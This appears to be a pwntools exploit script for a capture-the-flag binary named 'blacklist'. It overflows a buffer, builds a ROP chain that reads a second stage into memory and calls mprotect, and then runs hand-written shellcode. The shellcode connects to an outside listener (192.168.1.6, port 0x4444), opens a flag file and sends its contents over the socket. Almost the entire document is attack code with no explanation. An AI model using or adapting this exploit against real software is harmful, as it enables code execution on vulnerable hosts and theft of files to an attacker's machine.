from pwn import *
context.arch='amd64'

elf = ELF('./blacklist')
p = process('./blacklist')
#p = remote('40.71.72.198', 1236)

bss = elf.bss()

flag_path =  '/home/fbi/flag.txt\x00'
#p = remote('40.71.72.198', 1236)

def __init__(self, prog, ps):
	self.prog = ELF(prog)
	self.ps   = ps
        
listen_ip = '192.186.1.6'
listen_port = 0x4444

#listener = listen(self.listen_port)

gdb.attach(p, gdbscript=
'''b*0x0000000000401e9d
c
''')

main_ret = p64(0x0000000000401ecb)

pop_rdi = p64(0x00000000004018ca)
pop_rsi = p64(0x00000000004028b8)
pop_rdx = p64(0x00000000004017cf)
pop_rax = p64(0x0000000000414e53)
pop_rsp = p64(0x402307)

addr = 0x004dd000
gets_addr = p64(0x4208b0)
mprotect = p64(0x458a60)
syscall = p64(0x426094)


shell = asm("""mov rax, 0x29
    mov rdi, 0x2
    mov rsi, 0x1
    xor rdx, rdx
    syscall

    mov rdi, rax
    mov rdx, 0x10
    movabs rax, 0x0601a8c044440002
    push rax
    mov rsi, rsp
    mov rax, 0x2a
    syscall

    mov rbx, rax
    mov rax, 257
    mov rdi, 6
    mov rsi, {}
    xor rdx, rdx
    xor r10, r10
    syscall

    mov rsi, rax
    mov rax, 40
    mov rdi, rbx
    mov r10, 20
    syscall
	""".format(addr))

#to_send = buf + binary_ip(self.listen_ip) + payload + self.reverse_shell
payload = 'a'*0x48
payload += pop_rdi
payload += p64(0x0)
payload += pop_rsi
payload += p64(addr)
payload += pop_rdx
payload += p64(0x50)
payload += pop_rax
payload += p64(0x0)
payload += syscall
payload += pop_rsp
payload += p64(addr + len(flag_path))

sleep(0.1)
p.sendline(payload)

#payload = 'a'*0x48
payload = pop_rdi
payload += p64(addr)
payload += gets_addr
payload += pop_rdi + p64(addr) + pop_rsi + p64(0x3000) + pop_rdx + p64(0x7)
payload += mprotect
payload += p64(addr)

sleep(0.1)
p.sendline(flag_path + payload + shell)

p.interactive()

#	pop rax
#	mov r12, 0x67616c662f2f2f2f
#	mov rsi, 0x004dd000
#	mov qword ptr [rsi], r12
